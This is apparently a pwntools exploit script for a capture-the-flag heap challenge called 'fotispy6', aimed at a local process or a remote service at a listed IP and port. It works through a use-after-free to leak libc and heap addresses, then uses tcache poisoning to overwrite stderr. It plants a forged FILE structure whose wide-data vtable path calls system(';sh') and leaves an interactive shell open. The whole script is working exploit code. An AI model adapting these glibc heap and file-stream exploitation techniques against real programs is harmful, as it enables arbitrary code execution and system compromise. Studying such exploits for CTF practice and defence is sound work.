from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./fotispy6"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("52.59.124.14", 5196)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


def create(name, pwd):
    io.sendlineafter("[~] Choice: ", "1")
    io.sendlineafter("Username: ", name)
    io.sendlineafter("Password: ", pwd)


def addsong(howlong, comment):
    io.sendlineafter("[~] Choice: ", "2")
    io.sendlineafter("l the comment be:", str(howlong))
    io.sendlineafter("Enter the comment: ", comment)


def edit(idx, howlong, comment):
    io.sendlineafter("[~] Choice: ", "3")
    io.sendlineafter("you want to select:", str(idx))
    io.sendlineafter("will the new comment be: ", str(howlong))
    io.sendlineafter("Enter the new comment: ", comment)


def view(idx):
    io.sendlineafter("[~] Choice: ", "4")
    io.sendlineafter("you want to select:", str(idx))


def delete(idx):
    io.sendlineafter("[~] Choice: ", "5")
    io.sendlineafter("you want to select:", str(idx))


def exit():
    io.sendlineafter("[~] Choice: ", "0")


create("tinyfat", "pwdtinyfat")
addsong(0xe0, "tinyfatcomment")
addsong(0xe0, "tinyfatcomment2")
addsong(0x460, "tinyfatcomment3")
addsong(0xe0, "tinyfatcomment4")

view(0)
delete(2)
delete(1)
delete(0)
view(2)
leak = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
libc.address = leak - 0x1ecbe0
log.success("libc.address :-----> " + hex(libc.address))

view(0)
io.recvuntil("comment:\n", drop=True)
leak = u64(io.recv(6).ljust(8, b"\x00"))
heap = leak - 0x310
log.success("heap :-----> " + hex(heap))

stderr_adr = libc.symbols["_IO_2_1_stderr_"]

file = FileStructure(0)
file.flags = u64(p32(0xfbad0101) + b";sh\0")
file._IO_save_end = libc.sym["system"]
file._lock = stderr_adr - 0x10
file._wide_data = stderr_adr - 0x10
file._offset = 0
file._old_offset = 0
payload = b"\x00" * 24 + p32(1) + p32(0) + p64(0)
payload += p64(libc.symbols["_IO_2_1_stderr_"] - 0x10)
payload += p64(libc.symbols["_IO_wfile_jumps"] + 0x18 - 0x58)
file.unknown2 = payload

edit(0, 20, p64(stderr_adr))
addsong(0xe0, "aaa")
ddebug("breakrva 0x0000149C \n breakrva 0x016DB \n continue")
addsong(0xe0, bytes(file)[:0xe0])

exit()
io.interactive()
